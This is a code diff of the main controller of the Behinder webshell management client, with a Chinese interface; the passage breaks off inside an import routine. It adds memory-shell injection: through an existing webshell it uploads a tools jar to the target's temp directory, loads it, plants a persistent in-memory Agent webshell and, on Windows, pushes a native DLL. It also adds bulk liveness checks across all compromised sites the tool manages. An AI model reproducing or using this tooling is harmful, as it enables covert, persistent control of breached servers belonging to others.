@@ -1,12 +1,15 @@
 package net.rebeyond.behinder.ui.controller;
 
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.ByteArrayInputStream;
+import java.io.File;
 import java.net.Authenticator;
 import java.net.InetSocketAddress;
 import java.net.PasswordAuthentication;
 import java.net.Proxy;
 import java.net.URL;
 import java.net.Proxy.Type;
+import java.security.SecureRandom;
 import java.sql.Timestamp;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -15,15 +18,17 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import java.util.Optional;
+import java.util.regex.Pattern;
+import javafx.application.Platform;
 import javafx.beans.property.SimpleStringProperty;
 import javafx.beans.property.StringProperty;
-import javafx.beans.value.ObservableValue;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
 import javafx.fxml.FXML;
 import javafx.fxml.FXMLLoader;
 import javafx.geometry.Insets;
 import javafx.geometry.Pos;
+import javafx.scene.Node;
 import javafx.scene.Parent;
 import javafx.scene.Scene;
 import javafx.scene.control.Alert;
@@ -34,7 +39,9 @@ import javafx.scene.control.ContextMenu;
 import javafx.scene.control.Label;
 import javafx.scene.control.MenuItem;
 import javafx.scene.control.RadioButton;
+import javafx.scene.control.SelectionMode;
 import javafx.scene.control.SeparatorMenuItem;
+import javafx.scene.control.TableCell;
 import javafx.scene.control.TableColumn;
 import javafx.scene.control.TableRow;
 import javafx.scene.control.TableView;
@@ -43,16 +50,20 @@ import javafx.scene.control.TextField;
 import javafx.scene.control.ToggleGroup;
 import javafx.scene.control.TreeItem;
 import javafx.scene.control.TreeView;
+import javafx.scene.control.Alert.AlertType;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
 import javafx.scene.input.Clipboard;
 import javafx.scene.input.ClipboardContent;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
+import javafx.stage.FileChooser;
 import javafx.stage.Stage;
 import javafx.stage.Window;
 import net.rebeyond.behinder.core.Constants;
+import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.dao.ShellManager;
+import net.rebeyond.behinder.utils.StringUtils;
 import net.rebeyond.behinder.utils.Utils;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -62,6 +73,8 @@ public class MainController {
    private TreeView treeview;
    @FXML
    private TableView shellListTable;
+   @FXML
+   private TableColumn idCol;
    @FXML
    private TableColumn urlCol;
    @FXML
@@ -75,17 +88,36 @@ public class MainController {
    @FXML
    private TableColumn addTimeCol;
    @FXML
+   private TableColumn statusCol;
+   @FXML
    private MenuItem proxySetupBtn;
+   @FXML
+   private Label checkAliveBtn;
+   @FXML
+   private Label importBtn;
+   @FXML
+   private TextField searchShellTxt;
    @FXML
    private Label statusLabel;
    @FXML
    private Label versionLabel;
+   @FXML
+   private Label searchShellLabel;
    @FXML
    private Label proxyStatusLabel;
    @FXML
    private TreeView catagoryTreeView;
    private ShellManager shellManager;
    public static Map currentProxy = new HashMap();
+   private int COL_INDEX_URL = 0;
+   private int COL_INDEX_IP = 1;
+   private int COL_INDEX_TYPE = 2;
+   private int COL_INDEX_OS = 3;
+   private int COL_INDEX_COMMENT = 4;
+   private int COL_INDEX_ADDTIME = 5;
+   private int COL_INDEX_STATUS = 6;
+   private int COL_INDEX_ID = 7;
+   private int COL_INDEX_MEMTYPE = 8;
 
    public MainController() {
       try {
@@ -106,7 +138,6 @@ public class MainController {
          this.initBottomBar();
          this.loadProxy();
       } catch (Exception var2) {
-         var2.printStackTrace();
       }
 
    }
@@ -141,9 +172,19 @@ public class MainController {
 
    }
 
+   private void initIcons() {
+      try {
+         this.searchShellLabel.setGraphic(new ImageView(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/search.png")))));
+      } catch (Exception var2) {
+      }
+
+   }
+
    private void initToolbar() {
+      this.initIcons();
       this.proxySetupBtn.setOnAction((event) -> {
-         Alert inputDialog = new Alert(Alert.AlertType.NONE);
+         Alert inputDialog = new Alert(AlertType.NONE);
+         inputDialog.setResizable(true);
          Window window = inputDialog.getDialogPane().getScene().getWindow();
          window.setOnCloseRequest((e) -> {
             window.hide();
@@ -162,7 +203,7 @@ public class MainController {
          proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
          Label typeLabel = new Label("类型：");
          ComboBox typeCombo = new ComboBox();
-         typeCombo.setItems(FXCollections.observableArrayList("HTTP", "SOCKS"));
+         typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
          typeCombo.getSelectionModel().select(0);
          Label IPLabel = new Label("IP地址：");
          TextField IPText = new TextField();
@@ -203,7 +244,6 @@ public class MainController {
             }
          } catch (Exception var28) {
             this.statusLabel.setText("代理服务器配置加载失败。");
-            var28.printStackTrace();
          }
 
          saveBtn.setOnAction((e) -> {
@@ -214,7 +254,6 @@ public class MainController {
                try {
                   this.shellManager.updateProxy("default", typeCombo.getSelectionModel().getSelectedItem().toString(), IPText.getText(), PortText.getText(), userNameText.getText(), passwordText.getText(), Constants.PROXY_DISABLE);
                } catch (Exception var12) {
-                  var12.printStackTrace();
                }
 
                inputDialog.getDialogPane().getScene().getWindow().hide();
@@ -222,17 +261,16 @@ public class MainController {
                try {
                   this.shellManager.updateProxy("default", typeCombo.getSelectionModel().getSelectedItem().toString(), IPText.getText(), PortText.getText(), userNameText.getText(), passwordText.getText(), Constants.PROXY_ENABLE);
                } catch (Exception var13) {
-                  var13.printStackTrace();
                }
 
                String type = null;
                if (!userNameText.getText().trim().equals("")) {
                   final String proxyUser = userNameText.getText().trim();
                   type = passwordText.getText();
-                  final String finalString = type;
+                  final char[] typeChars = type.toCharArray();
                   Authenticator.setDefault(new Authenticator() {
                      public PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(proxyUser, finalString.toCharArray());
+                        return new PasswordAuthentication(proxyUser, typeChars);
                      }
                   });
                } else {
@@ -280,6 +318,182 @@ public class MainController {
          inputDialog.getDialogPane().setContent(proxyGridPane);
          inputDialog.showAndWait();
       });
+      this.checkAliveBtn.setOnMouseClicked((event) -> {
+         Alert alert = new Alert(AlertType.CONFIRMATION);
+         alert.setResizable(true);
+         alert.setHeaderText("");
+         alert.setContentText("请确认是否批量检测网站列表中所有站点的存活状态？");
+         Optional result = alert.showAndWait();
+         if (result.get() != ButtonType.CANCEL) {
+            int[] current = new int[]{0};
+            int total = this.shellListTable.getItems().size();
+            Iterator var6 = this.shellListTable.getItems().iterator();
+
+            while(var6.hasNext()) {
+               Object item = var6.next();
+               Runnable runner = () -> {
+                  int shellID = this.getShellID((ArrayList)item);
+                  String shellUrl = this.getShellUrl((ArrayList)item);
+                  boolean var20 = false;
+
+                  int var10002;
+                  label133: {
+                     try {
+                        var20 = true;
+                        JSONObject shellEntity = this.shellManager.findShell(shellID);
+                        ShellService shellService = new ShellService(shellEntity);
+                        boolean isAlive = shellService.doConnect();
+                        this.shellManager.setShellStatus(shellID, Constants.SHELL_STATUS_ALIVE);
+                        var20 = false;
+                        break label133;
+                     } catch (Exception var25) {
+                        try {
+                           this.shellManager.setShellStatus(shellID, Constants.SHELL_STATUS_DEAD);
+                           var20 = false;
+                        } catch (Exception var23) {
+                           var20 = false;
+                        }
+                     } finally {
+                        if (var20) {
+                           Platform.runLater(() -> {
+                              this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total));
+                           });
+                           synchronized(this) {
+                              var10002 = current[0]++;
+                           }
+
+                           if (current[0] == total) {
+                              Platform.runLater(() -> {
+                                 this.statusLabel.setText("全部检测完成。");
+                              });
+                           }
+
+                        }
+                     }
+
+                     Platform.runLater(() -> {
+                        this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total));
+                     });
+                     synchronized(this) {
+                        var10002 = current[0]++;
+                     }
+
+                     if (current[0] == total) {
+                        Platform.runLater(() -> {
+                           this.statusLabel.setText("全部检测完成。");
+                        });
+                     }
+
+                     return;
+                  }
+
+                  Platform.runLater(() -> {
+                     this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total));
+                  });
+                  synchronized(this) {
+                     var10002 = current[0]++;
+                  }
+
+                  if (current[0] == total) {
+                     Platform.runLater(() -> {
+                        this.statusLabel.setText("全部检测完成。");
+                     });
+                  }
+
+               };
+               Thread workThrad = new Thread(runner);
+               workThrad.start();
+            }
+
+         }
+      });
+      this.searchShellTxt.textProperty().addListener((observable, oldValue, newValue) -> {
+         try {
+            this.shellListTable.getItems().clear();
+            JSONArray shellList = this.shellManager.findShellByUrl(newValue);
+            this.fillShellRows(shellList);
+         } catch (Exception var5) {
+         }
+
+      });
+      this.importBtn.setOnMouseClicked((event) -> {
+         try {
+            this.importData();
+         } catch (Exception var3) {
+            this.statusLabel.setText("导入失败：" + var3.getMessage());
+         }
+
+      });
+   }
+
+   private boolean checkSingleAlive() {
+      return true;
+   }
+
+   private void injectMemShell(int shellID, String type, String path) {
+      Runnable runner = () -> {
+         try {
+            if (!path.startsWith("/")) {
+               Utils.showErrorMessage("错误", "路径必须以\"/\"开头");
+               return;
+            }
+
+            Pattern.compile(path);
+            JSONObject shellEntity = this.shellManager.findShell(shellID);
+            ShellService shellService = new ShellService(shellEntity);
+            shellService.doConnect();
+            String osInfo = shellEntity.getString("os");
+            int osType;
+            String libPath;
+            if (osInfo == null || osInfo.equals("")) {
+               osType = (new SecureRandom()).nextInt(3000);
+               libPath = Utils.getRandomString(osType);
+               JSONObject basicInfoObj = new JSONObject(shellService.getBasicInfo(libPath));
+               osInfo = (new String(Base64.decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
+            }
+
+            osType = Utils.getOSType(osInfo);
+            libPath = Utils.getRandomString(6);
+            if (osType == Constants.OS_TYPE_WINDOWS) {
+               libPath = "c:/windows/temp/" + libPath;
+            } else {
+               libPath = "/tmp/" + libPath;
+            }
+
+            shellService.uploadFile(libPath, Utils.getResourceData("net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar"), true);
+            shellService.loadJar(libPath);
+            shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString("password")));
+
+            try {
+               String memUrl = Utils.getBaseUrl(shellEntity.getString("url")) + path;
+               shellEntity.put("url", (Object)memUrl);
+               int memType = this.getMemTypeFromType(type);
+               shellEntity.put("memType", memType);
+               this.addShell(shellEntity);
+               this.loadShellList();
+               this.shellListTable.getSelectionModel().select(this.shellListTable.getItems().size() - 1);
+               Platform.runLater(() -> {
+                  this.statusLabel.setText("注入完成。");
+               });
+               if (osType == Constants.OS_TYPE_WINDOWS) {
+                  byte[] nativeLibraryFileContent = Utils.getFileData("/Users/rebeyond/JavaNative.dll");
+                  shellService.loadLibraryAndfreeFile(java.util.Base64.getEncoder().encodeToString(nativeLibraryFileContent), libPath);
+               }
+            } catch (Exception var14) {
+               Platform.runLater(() -> {
+                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var14.getMessage());
+               });
+            }
+         } catch (Exception var15) {
+            var15.printStackTrace();
+            Platform.runLater(() -> {
+               this.statusLabel.setText("注入失败：" + var15.getMessage());
+            });
+         }
+
+      };
+      Thread worker = new Thread(runner);
+      worker.start();
    }
 
    private void initCatagoryList() throws Exception {
@@ -294,22 +508,90 @@ public class MainController {
    }
 
    private void initShellTable() throws Exception {
+      this.shellListTable.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);
       ObservableList tcs = this.shellListTable.getColumns();
 
-      for(int i = 0; i < tcs.size(); ++i) {
-         final int finalInt = i;
+      for(int i = 1; i < tcs.size(); ++i) {
+         int j = i - 1;
          ((TableColumn)tcs.get(i)).setCellValueFactory((data) -> {
-            return (ObservableValue)((List)((TableColumn.CellDataFeatures)data).getValue()).get(finalInt);
+            return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(j);
+            //return (StringProperty)((List)data.getValue()).get(j);
          });
       }
 
+      this.idCol.setCellFactory((col) -> {
+         TableCell cell = new TableCell() {
+            @Override
+            protected void updateItem(Object item, boolean empty) {
+               super.updateItem(StringUtils.toStringEmpty(item), empty);
+               this.setText((String)null);
+               this.setGraphic((Node)null);
+               if (!empty) {
+                  int rowIndex = this.getIndex() + 1;
+                  this.setText(String.valueOf(rowIndex));
+                  this.setAlignment(Pos.CENTER);
+               }
+
+            }
+         };
+         return cell;
+      });
+      this.statusCol.setCellFactory((col) -> {
+         TableCell cell = new TableCell() {
+
+            @Override
+            protected void updateItem(Object item, boolean empty) {
+               super.updateItem(StringUtils.toStringEmpty(item), empty);
+               if (empty) {
+                  this.setGraphic((Node)null);
+               } else {
+                  Object rowItem = this.getTableRow().getItem();
+                  if (rowItem == null) {
+                     this.setGraphic((Node)null);
+                  } else {
+                     try {
+                        String memType = ((StringProperty)((List)this.getTableRow().getItem()).get(MainController.this.COL_INDEX_MEMTYPE)).getValue();
+                        String iconPath = null;
+                        if (item.equals("0")) {
+                           if (memType.equals("0")) {
+                              iconPath = "net/rebeyond/behinder/resource/alive.png";
+                           } else {
+                              iconPath = "net/rebeyond/behinder/resource/memshell_alive.png";
+                           }
+                        } else if (item.equals("1")) {
+                           if (memType.equals("0")) {
+                              iconPath = "net/rebeyond/behinder/resource/dead.png";
+                           } else {
+                              iconPath = "net/rebeyond/behinder/resource/memshell_dead.png";
+                           }
+                        }
+
+                        Image image = new Image(new ByteArrayInputStream(Utils.getResourceData(iconPath)));
+                        this.setGraphic(new ImageView(image));
+                        this.setAlignment(Pos.CENTER);
+                     } catch (Exception var7) {
+                        var7.printStackTrace();
+                        this.setText(StringUtils.toStringEmpty(item));
+                     }
+
+                  }
+               }
+            }
+         };
+         return cell;
+      });
       this.shellListTable.setRowFactory((tv) -> {
          TableRow row = new TableRow();
          row.setOnMouseClicked((event) -> {
             if (event.getClickCount() == 2 && !row.isEmpty()) {
-               String url = ((StringProperty)((List)row.getItem()).get(0)).getValue();
-               String shellID = ((StringProperty)((List)row.getItem()).get(6)).getValue();
-               this.openShell(url, shellID);
+               String url = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_URL)).getValue();
+               String shellID = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_ID)).getValue();
+
+               try {
+                  this.openShell(url, shellID);
+               } catch (Exception var6) {
+                  this.statusLabel.setText("shell打开失败。");
+               }
             }
 
          });
@@ -321,7 +603,7 @@ public class MainController {
       try {
          new URL(urlString.trim());
          return true;
-      } catch (Exception var4) {
+      } catch (Exception var3) {
          this.showErrorMessage("错误", "URL格式错误");
          return false;
       }
@@ -340,7 +622,8 @@ public class MainController {
    }
 
    private void showShellDialog(int shellID) throws Exception {
-      Alert alert = new Alert(Alert.AlertType.NONE);
+      Alert alert = new Alert(AlertType.NONE);
+      alert.setResizable(true);
       Window window = alert.getDialogPane().getScene().getWindow();
       window.setOnCloseRequest((e) -> {
          window.hide();
@@ -352,7 +635,7 @@ public class MainController {
       TextField urlText = new TextField();
       TextField passText = new TextField();
       ComboBox shellType = new ComboBox();
-      ObservableList typeList = FXCollections.observableArrayList("jsp", "php", "aspx", "asp");
+      ObservableList typeList = FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp"});
       shellType.setItems(typeList);
       ComboBox shellCatagory = new ComboBox();
 
@@ -410,7 +693,7 @@ public class MainController {
       vpsInfoPane.add(commnet, 1, 5);
       HBox buttonBox = new HBox();
       buttonBox.setSpacing(20.0D);
-      buttonBox.getChildren().addAll(cancelBtn, saveBtn);
+      buttonBox.getChildren().addAll(new Node[]{cancelBtn, saveBtn});
       buttonBox.setAlignment(Pos.BOTTOM_CENTER);
       vpsInfoPane.add(buttonBox, 0, 8);
       GridPane.setColumnSpan(buttonBox, 2);
@@ -433,19 +716,21 @@ public class MainController {
             String catagory = shellCatagory.getValue().toString();
             String comment = commnet.getText();
             String headers = header.getText();
+            String os = "";
+            int status = Constants.SHELL_STATUS_ALIVE;
+            int memType = Constants.MEMSHELL_TYPE_FILE;
 
             try {
                if (shellID == -1) {
-                  this.shellManager.addShell(url, password, type, catagory, comment, headers);
+                  this.shellManager.addShell(url, password, type, catagory, os, comment, headers, status, memType);
                } else {
                   this.shellManager.updateShell(shellID, url, password, type, catagory, comment, headers);
                }
 
                this.loadShellList();
                return;
-            } catch (Exception var20) {
-               var20.printStackTrace();
-               this.showErrorMessage("保存失败", var20.getMessage());
+            } catch (Exception var23) {
+               this.showErrorMessage("保存失败", var23.getMessage());
             } finally {
                alert.getDialogPane().getScene().getWindow().hide();
             }
@@ -458,31 +743,39 @@ public class MainController {
       alert.showAndWait();
    }
 
-   private void openShell(String url, String shellID) {
-      try {
-         FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/MainWindow.fxml"));
-         Parent mainWindow = (Parent)loader.load();
-         MainWindowController mainWindowController = (MainWindowController)loader.getController();
-         mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy);
-         Stage stage = new Stage();
-         stage.setTitle(url);
-         stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
-         stage.setUserData(url);
-         stage.setScene(new Scene(mainWindow));
-         stage.setOnCloseRequest((e) -> {
-            Iterator var2 = mainWindowController.getWorkList().iterator();
+   private void openShell(String url, String shellID) throws Exception {
+      FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/MainWindow.fxml"));
+      Parent mainWindow = (Parent)loader.load();
+      MainWindowController mainWindowController = (MainWindowController)loader.getController();
+      mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy);
+      Stage stage = new Stage();
+      stage.setTitle(url);
+      stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
+      stage.setUserData(url);
+      stage.setScene(new Scene(mainWindow));
+      stage.setOnCloseRequest((e) -> {
+         Runnable runner = () -> {
+            List workerList = mainWindowController.getWorkList();
+            Iterator var2 = workerList.iterator();
 
             while(var2.hasNext()) {
                Thread worker = (Thread)var2.next();
-               worker.interrupt();
+
+               while(worker.isAlive()) {
+                  try {
+                     worker.stop();
+                  } catch (Exception var5) {
+                  } catch (Error var6) {
+                  }
+               }
             }
 
-         });
-         stage.show();
-      } catch (Exception var7) {
-         var7.printStackTrace();
-      }
-
+            workerList.clear();
+         };
+         Thread worker = new Thread(runner);
+         worker.start();
+      });
+      stage.show();
    }
 
    private void loadContextMenu() {
@@ -497,37 +790,22 @@ public class MainController {
       cm.getItems().add(delBtn);
       MenuItem copyBtn = new MenuItem("复制URL");
       cm.getItems().add(copyBtn);
+      MenuItem memShellBtn = new MenuItem("注入内存马");
+      cm.getItems().add(memShellBtn);
       SeparatorMenuItem separatorBtn = new SeparatorMenuItem();
       cm.getItems().add(separatorBtn);
       MenuItem refreshBtn = new MenuItem("刷新");
       cm.getItems().add(refreshBtn);
       this.shellListTable.setContextMenu(cm);
       openBtn.setOnAction((event) -> {
-         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(0)).getValue();
-         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(6)).getValue();
+         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
+         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
 
          try {
-            FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/MainWindow.fxml"));
-            Parent mainWindow = (Parent)loader.load();
-            MainWindowController mainWindowController = (MainWindowController)loader.getController();
-            mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy);
-            Stage stage = new Stage();
-            stage.setTitle(url);
-            stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
-            stage.setUserData(url);
-            stage.setScene(new Scene(mainWindow));
-            stage.setOnCloseRequest((e) -> {
-               Iterator var2 = mainWindowController.getWorkList().iterator();
-
-               while(var2.hasNext()) {
-                  Thread worker = (Thread)var2.next();
-                  worker.interrupt();
-               }
-
-            });
-            stage.show();
-         } catch (Exception var8) {
-            var8.printStackTrace();
+            this.openShell(url, shellID);
+         } catch (Exception var5) {
+            this.statusLabel.setText("shell打开失败。");
+            var5.printStackTrace();
          }
 
       });
@@ -541,7 +819,7 @@ public class MainController {
 
       });
       editBtn.setOnAction((event) -> {
-         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(6)).getValue();
+         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
 
          try {
             this.showShellDialog(Integer.parseInt(shellID));
@@ -552,25 +830,94 @@ public class MainController {
 
       });
       delBtn.setOnAction((event) -> {
-         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
+         int size = this.shellListTable.getSelectionModel().getSelectedItems().size();
+         Alert alert = new Alert(AlertType.CONFIRMATION);
+         alert.setResizable(true);
          alert.setHeaderText("");
          alert.setContentText("请确认是否删除？");
          Optional result = alert.showAndWait();
          if (result.get() == ButtonType.OK) {
-            String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(6)).getValue();
+            Iterator var5 = this.shellListTable.getSelectionModel().getSelectedItems().iterator();
+
+            while(var5.hasNext()) {
+               Object item = var5.next();
+               String shellID = ((StringProperty)((List)item).get(this.COL_INDEX_ID)).getValue();
+
+               try {
+                  this.shellManager.deleteShell(Integer.parseInt(shellID));
+               } catch (Exception var10) {
+                  var10.printStackTrace();
+               }
+            }
 
             try {
-               this.shellManager.deleteShell(Integer.parseInt(shellID));
                this.loadShellList();
-            } catch (Exception var6) {
-               var6.printStackTrace();
+            } catch (Exception var9) {
+               var9.printStackTrace();
             }
          }
 
       });
       copyBtn.setOnAction((event) -> {
-         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(0)).getValue();
+         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
          this.copyString(url);
+      });
+      memShellBtn.setOnAction((event) -> {
+         String scriptType = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_TYPE)).getValue();
+         if (!scriptType.equals("jsp")) {
+            Utils.showErrorMessage("提示", "内存马植入目前仅支持Java");
+         } else {
+            Alert inputDialog = new Alert(AlertType.NONE);
+            inputDialog.setWidth(300.0D);
+            inputDialog.setResizable(true);
+            inputDialog.setTitle("注入内存马");
+            Window window = inputDialog.getDialogPane().getScene().getWindow();
+            window.setOnCloseRequest((e) -> {
+               window.hide();
+            });
+            GridPane injectGridPane = new GridPane();
+            injectGridPane.setVgap(15.0D);
+            injectGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
+            Label typeLabel = new Label("注入类型：");
+            ComboBox typeCombo = new ComboBox();
+            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"Agent"}));
+            typeCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
+               if (!newValue.equals("Filter") && newValue.equals("Servlet")) {
+               }
+
+            });
+            typeCombo.getSelectionModel().select(0);
+            Label pathLabel = new Label("注入路径：");
+            pathLabel.setAlignment(Pos.CENTER_RIGHT);
+            TextField pathText = new TextField();
+            pathText.setPrefWidth(300.0D);
+            pathText.setPromptText("支持正则表达式，如/shell/memshell.*");
+            Button cancelBtn = new Button("取消");
+            Button saveBtn = new Button("保存");
+            saveBtn.setOnAction((e) -> {
+               this.statusLabel.setText("正在植入内存马……");
+               String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
+               String type = typeCombo.getValue().toString();
+               this.injectMemShell(Integer.parseInt(shellID), type, pathText.getText().trim());
+               inputDialog.getDialogPane().getScene().getWindow().hide();
+            });
+            cancelBtn.setOnAction((e) -> {
+               inputDialog.getDialogPane().getScene().getWindow().hide();
+            });
+            injectGridPane.add(typeLabel, 0, 0);
+            injectGridPane.add(typeCombo, 1, 0);
+            injectGridPane.add(pathLabel, 0, 1);
+            injectGridPane.add(pathText, 1, 1);
+            HBox buttonBox = new HBox();
+            buttonBox.setSpacing(20.0D);
+            buttonBox.setAlignment(Pos.CENTER);
+            buttonBox.getChildren().add(cancelBtn);
+            buttonBox.getChildren().add(saveBtn);
+            GridPane.setColumnSpan(buttonBox, 2);
+            injectGridPane.add(buttonBox, 0, 2);
+            inputDialog.getDialogPane().setContent(injectGridPane);
+            inputDialog.showAndWait();
+         }
       });
       refreshBtn.setOnAction((event) -> {
          try {
@@ -580,6 +927,29 @@ public class MainController {
          }
 
       });
+   }
+
+   private int getMemTypeFromType(String type) {
+      if (type.equals("Agent")) {
+         return Constants.MEMSHELL_TYPE_AGENT;
+      } else if (type.equals("Filter")) {
+         return Constants.MEMSHELL_TYPE_FILTER;
+      } else {
+         return type.equals("Servlet") ? Constants.MEMSHELL_TYPE_SERVLET : Constants.MEMSHELL_TYPE_FILE;
+      }
+   }
+
+   private void addShell(JSONObject shellEntity) throws Exception {
+      String url = Utils.getOrDefault(shellEntity, "url", String.class);
+      String password = Utils.getOrDefault(shellEntity, "password", String.class);
+      String type = Utils.getOrDefault(shellEntity, "type", String.class);
+      String catagory = Utils.getOrDefault(shellEntity, "catagory", String.class);
+      String os = Utils.getOrDefault(shellEntity, "os", String.class);
+      String comment = Utils.getOrDefault(shellEntity, "comment", String.class);
+      String headers = Utils.getOrDefault(shellEntity, "headers", String.class);
+      int status = Integer.parseInt(Utils.getOrDefault(shellEntity, "status", Integer.TYPE));
+      int memType = Integer.parseInt(Utils.getOrDefault(shellEntity, "memType", Integer.TYPE));
+      this.shellManager.addShell(url, password, type, catagory, os, comment, headers, status, memType);
    }
 
    private void loadShellList() throws Exception {
@@ -603,17 +973,21 @@ public class MainController {
             String comment = rowObj.getString("comment");
             SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
             String addTime = df.format(new Timestamp(rowObj.getLong("addtime")));
+            int status = rowObj.getInt("status");
+            int memType = rowObj.getInt("memType");
             List row = new ArrayList();
-            row.add(0, new SimpleStringProperty(url));
-            row.add(1, new SimpleStringProperty(ip));
-            row.add(2, new SimpleStringProperty(type));
-            row.add(3, new SimpleStringProperty(os));
-            row.add(4, new SimpleStringProperty(comment));
-            row.add(5, new SimpleStringProperty(addTime));
-            row.add(6, new SimpleStringProperty(id + ""));
+            row.add(this.COL_INDEX_URL, new SimpleStringProperty(url));
+            row.add(this.COL_INDEX_IP, new SimpleStringProperty(ip));
+            row.add(this.COL_INDEX_TYPE, new SimpleStringProperty(type));
+            row.add(this.COL_INDEX_OS, new SimpleStringProperty(os));
+            row.add(this.COL_INDEX_COMMENT, new SimpleStringProperty(comment));
+            row.add(this.COL_INDEX_ADDTIME, new SimpleStringProperty(addTime));
+            row.add(this.COL_INDEX_STATUS, new SimpleStringProperty(status + ""));
+            row.add(this.COL_INDEX_ID, new SimpleStringProperty(id + ""));
+            row.add(this.COL_INDEX_MEMTYPE, new SimpleStringProperty(memType + ""));
             data.add(row);
-         } catch (Exception var14) {
-            var14.printStackTrace();
+         } catch (Exception var16) {
+            var16.printStackTrace();
          }
       }
 
@@ -628,7 +1002,7 @@ public class MainController {
    }
 
    private void showErrorMessage(String title, String msg) {
-      Alert alert = new Alert(Alert.AlertType.ERROR);
+      Alert alert = new Alert(AlertType.ERROR);
       Window window = alert.getDialogPane().getScene().getWindow();
       window.setOnCloseRequest((event) -> {
          window.hide();
@@ -646,7 +1020,7 @@ public class MainController {
       MenuItem delCatagoryBtn = new MenuItem("删除");
       treeContextMenu.getItems().add(delCatagoryBtn);
       addCatagoryBtn.setOnAction((event) -> {
-         Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
+         Alert alert = new Alert(AlertType.CONFIRMATION);
          alert.setTitle("新增分类");
          alert.setHeaderText("");
          GridPane panel = new GridPane();
@@ -676,7 +1050,7 @@ public class MainController {
       });
       delCatagoryBtn.setOnAction((event) -> {
          if (this.catagoryTreeView.getSelectionModel().getSelectedItem() != null) {
-            Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
+            Alert alert = new Alert(AlertType.CONFIRMATION);
             alert.setHeaderText("");
             alert.setContentText("请确认是否删除？仅删除分类信息，不会删除该分类下的网站。");
             Optional result = alert.showAndWait();
@@ -733,5 +1107,65 @@ public class MainController {
       rootItem.setExpanded(true);
       this.catagoryTreeView.setRoot(rootItem);
       this.catagoryTreeView.getSelectionModel().select(rootItem);
+   }
+
+   private void importData() throws Exception {
+      FileChooser fileChooser = new FileChooser();
+      fileChooser.setTitle("请选择需要导入的data.db文件");
+      File selectdFile = fileChooser.showOpenDialog(this.shellListTable.getScene().getWindow());
+      if (selectdFile != null) {
+         String dbPath = selectdFile.getAbsolutePath();
+         ShellManager oldShellManager = new ShellManager(dbPath);
+         JSONArray shells = oldShellManager.listShell();
+         Runnable runner = () -> {
+            int count = 0;
+            int duplicateCount = 0;
+
+            for(int i = 0; i < shells.length(); ++i) {
+               JSONObject shellEntity = shells.getJSONObject(i);
+
+               try {
+                  final Integer finalCount = count;
+                  Platform.runLater(() -> {
+                     this.statusLabel.setText(String.format("正在导入%d/%d...", finalCount, shells.length()));
+                  });
+                  this.addShell(shellEntity);
+                  ++count;
+               } catch (Exception var8) {
+                  if (var8.getMessage().equals("该URL已存在")) {
+                     ++duplicateCount;
+                  }
+               }
+            }
+
+            final Integer finalDuplicateCount = duplicateCount;
